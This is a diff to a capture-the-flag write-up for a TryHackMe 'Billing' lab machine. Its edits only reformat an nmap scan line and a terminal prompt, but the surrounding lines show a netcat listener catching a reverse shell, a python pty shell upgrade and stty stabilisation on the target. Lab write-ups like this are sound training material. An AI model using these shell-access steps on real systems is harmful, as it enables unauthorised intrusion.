@@ -32,7 +32,7 @@ mauzware aka mauzinho <br>
 
 - As always first thing that I do is Nmap scan.
   ```
-  nmap -sC -sV -T5 -p- 10.10.15.55 -> open ports: 22, 80, 3306, 5038
+  nmap -sC -sV -T5 -p- 10.10.15.55 
 
   Nmap scan report for 10.10.15.55
   Host is up (0.050s latency).
@@ -126,11 +126,12 @@ mauzware aka mauzinho <br>
   python3 -c "import pty; pty.spawn('/bin/bash')"  
 
   $ python3 -c 'import pty;pty.spawn("/bin/bash");'
-  asterisk@Billing:/var/www/html/mbilling/lib/icepay$ ^Z
+  asterisk@Billing:/var/www/html/mbilling/lib/icepay$
+  ^Z
   zsh: suspended  nc -lvnp 4444
                                                                                                                        
-  ┌──(mauzware㉿mauz)-[~/…/tryhackme/CTFs/EASY/Billing]
-  └─$ stty raw -echo;fg
+  
+  stty raw -echo;fg
   [2]  - continued  nc -lvnp 4444
                                  export TERM=xterm
   ```
